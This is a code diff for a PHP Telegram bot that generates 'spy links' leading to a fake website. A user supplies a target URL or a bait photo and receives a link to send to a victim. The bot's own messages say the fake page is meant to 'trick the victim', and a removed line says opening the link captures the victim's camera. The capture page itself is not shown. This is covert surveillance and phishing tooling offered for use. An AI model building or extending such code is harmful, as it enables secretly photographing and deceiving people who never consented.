@@ -29,39 +29,67 @@ if ($text == "/start") {
 
 // User clicked Custom Photo Link
 if ($callback && $callback["data"] == "ask_photo") {
-    // Save state that user is waiting to send a photo
     file_put_contents("state_$chatId.txt", "waiting_photo");
     sendTelegramMessage($botToken, $chatId, "📥 *Send a target photo (banner/image)*\nThis image will be shown on the fake website to trick the victim.");
     answerCallback($botToken, $callback["id"]);
+}
+
+// User clicked Normal Link
+if ($callback && $callback["data"] == "ask_url") {
+    file_put_contents("state_$chatId.txt", "waiting_url");
+    sendTelegramMessage($botToken, $chatId, "📥 *Send target URL*\nExample: `https://youtube.com`");
+    answerCallback($botToken, $callback["id"]);
+}
+
+// User sends text (URL for normal link)
+if ($text && !str_starts_with($text, "/")) {
+    $stateFile = "state_$chatId.txt";
+    if (file_exists($stateFile) && file_get_contents($stateFile) == "waiting_url") {
+        unlink($stateFile);
+        
+        $parsed = parse_url($text);
+        $domain = str_replace(['www.', '.'], ['', '_'], $parsed['host'] ?? 'link');
+        $shortCode = $domain . '_' . substr(time(), -4);
+        
+        $dbFile = "links.json";
+        $db = file_exists($dbFile) ? json_decode(file_get_contents($dbFile), true) : [];
+        $db[$shortCode] = [
+            'type' => 'url',
+            'url' => $text,
+            'image' => '',
+            'created_by' => $chatId,
+            'created_at' => date('Y-m-d H:i:s')
+        ];
+        file_put_contents($dbFile, json_encode($db));
+        
+        $spyLink = $website . "/?id=" . $shortCode;
+        sendTelegramMessage($botToken, $chatId, "✅ *Spy Link Generated!*\n\n🔗 `$spyLink`");
+    }
 }
 
 // User sent a Photo for custom link
 if ($photo) {
     $stateFile = "state_$chatId.txt";
     if (file_exists($stateFile) && file_get_contents($stateFile) == "waiting_photo") {
-        unlink($stateFile); // clear state
+        unlink($stateFile);
         
-        // Get highest resolution photo
         $fileId = end($photo)['file_id'];
-        
-        // Get file path from Telegram
         $fileInfo = json_decode(file_get_contents("https://api.telegram.org/bot$botToken/getFile?file_id=$fileId"), true);
         $filePath = $fileInfo['result']['file_path'];
         $fileUrl = "https://api.telegram.org/file/bot$botToken/" . $filePath;
         
-        // Save image locally in uploads folder
         if (!is_dir("uploads")) {
             mkdir("uploads", 0777, true);
         }
         $targetImageName = "target_" . $chatId . "_" . time() . ".jpg";
         copy($fileUrl, "uploads/" . $targetImageName);
         
-        // Generate shortcode
         $shortCode = 'custom_' . substr(time(), -5);
         $dbFile = "links.json";
         $db = file_exists($dbFile) ? json_decode(file_get_contents($dbFile), true) : [];
         $db[$shortCode] = [
             'type' => 'photo',
+            'url' => 'https://google.com',
             'image' => "uploads/" . $targetImageName,
             'created_by' => $chatId,
             'created_at' => date('Y-m-d H:i:s')
@@ -69,7 +97,7 @@ if ($photo) {
         file_put_contents($dbFile, json_encode($db));
         
         $spyLink = $website . "/?id=" . $shortCode;
-        sendTelegramMessage($botToken, $chatId, "✅ *Custom Spy Link Generated!*\n\n🔗 `$spyLink`\n\n📸 When the victim opens this, your uploaded photo will be displayed, and their camera will be captured!");
+        sendTelegramMessage($botToken, $chatId, "✅ *Custom Photo Spy Link Generated!*\n\n🔗 `$spyLink`\n\n📸 When someone opens this, your uploaded photo will be displayed on the page!");
     }
 }
 
